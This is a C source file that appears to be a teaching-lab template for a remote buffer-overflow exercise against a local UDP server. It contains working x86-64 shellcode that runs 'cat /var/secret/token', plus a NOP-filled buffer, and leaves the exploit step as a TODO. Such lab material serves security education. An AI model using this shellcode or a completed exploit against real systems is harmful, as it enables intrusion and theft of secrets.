/* exploit_1.c  */

/* Creates a file containing code for executing "cat /var/secret/token" */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

char shellcode[]=
  "\x48\x31\xc0"				/* xor     rax,rax			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x2f\x2f\x74\x6f\x6b\x65\x6e"	/* mov     rbx,0x6e656b6f742f2f2f	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x73\x65\x63\x72\x65\x74\x2f\x2f"	/* mov     rbx,0x2f2f746572636573	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x2f\x76\x61\x72\x2f\x2f\x2f\x2f"	/* mov     rbx,0x2f2f2f2f7261762f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe1"				/* mov     rcx,rsp			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74"	/* mov     rbx,0x7461632f6e69622f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe7"				/* mov     rdi,rsp			*/
  "\x50"					/* push    rax				*/
  "\x51"					/* push    rcx				*/
  "\x57"					/* push    rdi				*/
  "\x48\x31\xd2"				/* xor     rdx,rdx			*/
  "\x48\x89\xe6"				/* mov     rsi,rsp			*/
  "\xb0\x3b"					/* mov     al,0x3b			*/
  "\x0f\x05"					/* syscall				*/
;

int main(int argc, char **argv)
{
  struct sockaddr_in addr;
  struct sockaddr* saddr = (struct sockaddr*) &addr;
  struct sockaddr_in srv_addr;
  struct sockaddr* srv_saddr = (struct sockaddr*) &srv_addr;
  socklen_t srv_addr_size = sizeof(srv_addr);
  int sockfd;
  ssize_t rcvsize;

  char buffer[517];
  char resp[32];

  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(buffer, 0x90, 517);

  /* Create a UDP socket to communicate with the target server. */
  sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
  bzero(&srv_addr, sizeof(srv_addr));
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  srv_addr.sin_port = htons(8000);

  /* Send a message to the server, and collect the response. */
  sendto(sockfd, "hello", 6, 0, srv_saddr, srv_addr_size);
  bzero(resp, sizeof(resp));
  rcvsize = recvfrom(sockfd, resp, sizeof(resp), MSG_WAITALL, NULL, NULL);
  printf("received %d bytes\n",rcvsize);
  printf("%s\n",resp);

  /* TODO: put your code here */

  return 0;
}
